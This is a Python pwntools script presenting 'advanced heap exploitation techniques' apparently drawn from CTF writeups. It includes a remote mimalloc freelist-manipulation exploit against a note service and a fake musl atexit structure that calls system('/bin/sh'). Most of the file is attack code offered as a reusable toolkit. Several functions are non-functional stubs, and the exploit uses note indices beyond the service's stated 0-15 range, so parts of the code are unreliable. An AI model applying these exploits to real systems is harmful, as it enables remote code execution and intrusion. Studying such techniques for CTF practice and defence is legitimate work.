#!/usr/bin/env python3
"""
Advanced Heap Exploitation Techniques
Techniques extracted from real CTF writeups including mimalloc exploitation
"""

import os
import sys
import struct
import time
from pwn import *

class HeapExploitationTechniques:
    def __init__(self):
        self.context_setup()
        self.techniques = [
            "mimalloc_freelist_manipulation",
            "heap_feng_shui_advanced",
            "exit_handler_hijacking", 
            "arbitrary_read_write_primitive",
            "heap_spray_with_pipes"
        ]
    
    def context_setup(self):
        """Setup context for heap exploitation"""
        context.update(arch='x86_64', os='linux')
        context.log_level = 'info'
    
    def mimalloc_freelist_manipulation(self, target_host, target_port):
        """
        mimalloc allocator exploitation technique
        Based on free vs local_free manipulation from doremi challenge
        """
        print("[+] Implementing mimalloc freelist manipulation...")
        
        # Connect to target
        io = remote(target_host, target_port)
        
        # Phase 1: Create and free initial chunks
        print("[+] Creating and freeing initial chunks...")
        self.create_note(io, 0)
        self.create_note(io, 1)
        self.delete_note(io, 0)
        self.delete_note(io, 1)
        
        # Phase 2: Get heap leak
        print("[+] Getting heap leak...")
        heap_leak = self.read_note(io, 1)
        heap_base = self.extract_heap_base(heap_leak)
        print(f"[+] Heap base: {hex(heap_base)}")
        
        # Phase 3: Write target address to freelist
        target_addr = heap_base  # Target the beginning of heap page
        self.write_note(io, 1, p64(target_addr))
        
        # Phase 4: Trigger local_free -> free migration
        print("[+] Setting free to local_free...")
        for i in range(2, 32):  # Create 30 more notes (32 total)
            self.create_note(io, i)
        
        # Phase 5: Allocate target chunks
        print("[+] Creating target notes...")
        self.create_note(io, 32)  # This will be our target
        self.create_note(io, 33)  # This will point to our target
        
        # Phase 6: Read from target location
        target_data = self.read_note(io, 33)
        return self.parse_mimalloc_leak(target_data)
    
    def create_note(self, io, index):
        """Create a note at specified index"""
        io.sendlineafter(b"YAHNC> ", b"1")
        io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    
    def delete_note(self, io, index):
        """Delete note at specified index"""
        io.sendlineafter(b"YAHNC> ", b"2")
        io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    
    def read_note(self, io, index):
        """Read note at specified index"""
        io.sendlineafter(b"YAHNC> ", b"3")
        io.sendlineafter(b"Position? (0-15): ", str(index).encode())
        return io.recvline()
    
    def write_note(self, io, index, data):
        """Write data to note at specified index"""
        io.sendlineafter(b"YAHNC> ", b"4")
        io.sendlineafter(b"Position? (0-15): ", str(index).encode())
        io.sendlineafter(b"Content? (127 max): ", data)
    
    def extract_heap_base(self, heap_leak):
        """Extract heap base from leak"""
        # Parse the heap leak and extract base address
        leak_data = heap_leak.strip()
        if len(leak_data) >= 16:
            addr_bytes = bytes.fromhex(leak_data[:16].decode())
            addr = struct.unpack('<Q', addr_bytes)[0]
            return addr & 0xFFFFFFFFFFFFF000  # Align to page boundary
        return 0
    
    def parse_mimalloc_leak(self, target_data):
        """Parse mimalloc leak to find library base"""
        # Look for mi_subproc_default pointer pattern
        data_hex = target_data.strip().decode()
        
        # Extract potential library pointers
        for i in range(0, len(data_hex), 16):
            if i + 16 <= len(data_hex):
                chunk = data_hex[i:i+16]
                try:
                    addr_bytes = bytes.fromhex(chunk)
                    addr = struct.unpack('<Q', addr_bytes)[0]
                    
                    # Check if this looks like a library address
                    if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                        print(f"[+] Potential library leak: {hex(addr)}")
                        return addr
                except:
                    continue
        
        return None
    
    def heap_feng_shui_advanced(self, chunk_sizes, target_layout):
        """
        Advanced heap feng shui for precise memory layout
        """
        print("[+] Performing advanced heap feng shui...")
        
        # Phase 1: Initial allocation pattern
        allocated_chunks = []
        for i, size in enumerate(chunk_sizes):
            chunk_info = {
                'index': i,
                'size': size,
                'data': b'A' * (size - 8),  # Account for metadata
                'freed': False
            }
            allocated_chunks.append(chunk_info)
        
        # Phase 2: Strategic freeing pattern
        free_pattern = target_layout.get('free_pattern', [0, 2, 4])
        for idx in free_pattern:
            if idx < len(allocated_chunks):
                allocated_chunks[idx]['freed'] = True
        
        # Phase 3: Controlled reallocation
        realloc_pattern = target_layout.get('realloc_pattern', [])
        for realloc_info in realloc_pattern:
            chunk_info = {
                'target_idx': realloc_info['target'],
                'payload': realloc_info['payload'],
                'size': realloc_info['size']
            }
            allocated_chunks.append(chunk_info)
        
        return allocated_chunks
    
    def exit_handler_hijacking(self, system_addr, binsh_addr):
        """
        Exit handler hijacking technique for shell execution
        Based on musl atexit structure manipulation
        """
        print("[+] Implementing exit handler hijacking...")
        
        # musl atexit structure layout
        # struct fl {
        #     struct fl *next;
        #     void (*f[COUNT])(void *);
        #     void *a[COUNT];
        # }
        
        COUNT = 32  # Typical COUNT value in musl
        
        # Calculate structure offsets
        next_offset = 0
        f_array_offset = 8
        a_array_offset = f_array_offset + (COUNT * 8)
        
        # Build fake atexit structure
        fake_atexit = b'\x00' * 8  # next = NULL
        
        # Function array - put system() at first position
        f_array = struct.pack('<Q', system_addr)
        f_array += b'\x00' * ((COUNT - 1) * 8)  # Fill rest with zeros
        
        # Argument array - put "/bin/sh" at first position  
        a_array = struct.pack('<Q', binsh_addr)
        a_array += b'\x00' * ((COUNT - 1) * 8)  # Fill rest with zeros
        
        fake_atexit += f_array + a_array
        
        return {
            'fake_structure': fake_atexit,
            'structure_size': len(fake_atexit),
            'slot_value': 1  # Set slot to 1 to execute first handler
        }
    
    def arbitrary_read_write_primitive(self, target_addr, read_size=None, write_data=None):
        """
        Arbitrary read/write primitive using heap manipulation
        """
        print(f"[+] Setting up arbitrary read/write at {hex(target_addr)}")
        
        primitive = {
            'target_address': target_addr,
            'setup_chunks': [],
            'exploit_sequence': []
        }
        
        if read_size:
            # Setup for arbitrary read
            primitive['operation'] = 'read'
            primitive['read_size'] = read_size
            primitive['exploit_sequence'] = [
                ('create_fake_chunk', target_addr),
                ('trigger_allocation', None),
                ('read_target', read_size)
            ]
        
        if write_data:
            # Setup for arbitrary write
            primitive['operation'] = 'write'
            primitive['write_data'] = write_data
            primitive['exploit_sequence'] = [
                ('create_fake_chunk', target_addr),
                ('trigger_allocation', None),
                ('write_target', write_data)
            ]
        
        return primitive
    
    def heap_spray_with_pipes(self, spray_count=1000, chunk_size=0x1000):
        """
        Heap spray using pipe buffers for reliable exploitation
        """
        print(f"[+] Performing heap spray with {spray_count} pipe buffers...")
        
        spray_objects = []
        
        for i in range(spray_count):
            pipe_buffer = {
                'id': i,
                'size': chunk_size,
                'data': self.generate_spray_data(i, chunk_size),
                'pipe_fd': [None, None]  # Will be filled with actual pipe FDs
            }
            spray_objects.append(pipe_buffer)
        
        return spray_objects
    
    def generate_spray_data(self, spray_id, size):
        """Generate spray data with identifiable pattern"""
        # Create identifiable pattern for each spray object
        pattern = struct.pack('<Q', 0x4141414141414141 + spray_id)
        data = pattern * (size // 8)
        
        # Add any remaining bytes
        remaining = size % 8
        if remaining:
            data += pattern[:remaining]
        
        return data
    
    def detect_heap_challenge(self, file_path):
        """
        Detect if challenge involves heap exploitation
        """
        heap_indicators = [
            b"malloc",
            b"free", 
            b"calloc",
            b"realloc",
            b"heap",
            b"chunk",
            b"mimalloc",
            b"tcache",
            b"fastbin",
            b"unsorted",
            b"note",
            b"create",
            b"delete",
            b"edit"
        ]
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            
            detected_indicators = []
            for indicator in heap_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode())
            
            if len(detected_indicators) >= 3:  # Multiple indicators suggest heap challenge
                print(f"[+] Heap challenge detected with indicators: {detected_indicators}")
                return True
                
        except Exception as e:
            print(f"[-] Error analyzing file: {e}")
        
        return False
    
    def generate_heap_exploit(self, challenge_type, target_info):
        """
        Generate heap exploit based on challenge analysis
        """
        exploit_generators = {
            'mimalloc_uaf': self.mimalloc_freelist_manipulation,
            'exit_handler': self.exit_handler_hijacking,
            'arbitrary_rw': self.arbitrary_read_write_primitive,
            'heap_spray': self.heap_spray_with_pipes
        }
        
        if challenge_type in exploit_generators:
            return exploit_generators[challenge_type](**target_info)
        
        # Generic heap exploit template
        return self.generate_generic_heap_exploit(target_info)
    
    def generate_generic_heap_exploit(self, target_info):
        """Generate generic heap exploit template"""
        template = {
            'phase1': 'Initial heap layout setup',
            'phase2': 'Vulnerability trigger',
            'phase3': 'Heap manipulation',
            'phase4': 'Arbitrary read/write',
            'phase5': 'Code execution'
        }
        
        return template

def main():
    """Test heap exploitation techniques"""
    print("🔥 Advanced Heap Exploitation Techniques - Testing Suite")
    print("="*60)
    
    heap_exploiter = HeapExploitationTechniques()
    
    # Test exit handler hijacking
    system_addr = 0x7ffff7e50d70
    binsh_addr = 0x7ffff7f8d698
    exit_exploit = heap_exploiter.exit_handler_hijacking(system_addr, binsh_addr)
    print(f"[+] Exit handler exploit: {len(exit_exploit['fake_structure'])} bytes")
    
    # Test heap feng shui
    chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
    target_layout = {
        'free_pattern': [0, 2, 4],
        'realloc_pattern': [
            {'target': 1, 'payload': b'controlled_data', 'size': 0x38}
        ]
    }
    feng_shui = heap_exploiter.heap_feng_shui_advanced(chunk_sizes, target_layout)
    print(f"[+] Heap feng shui with {len(feng_shui)} chunks")
    
    # Test arbitrary read/write
    arb_rw = heap_exploiter.arbitrary_read_write_primitive(0x601000, write_data=b"shellcode")
    print(f"[+] Arbitrary R/W primitive at {hex(arb_rw['target_address'])}")
    
    print("\n[+] All heap exploitation techniques ready!")

if __name__ == "__main__":
    main()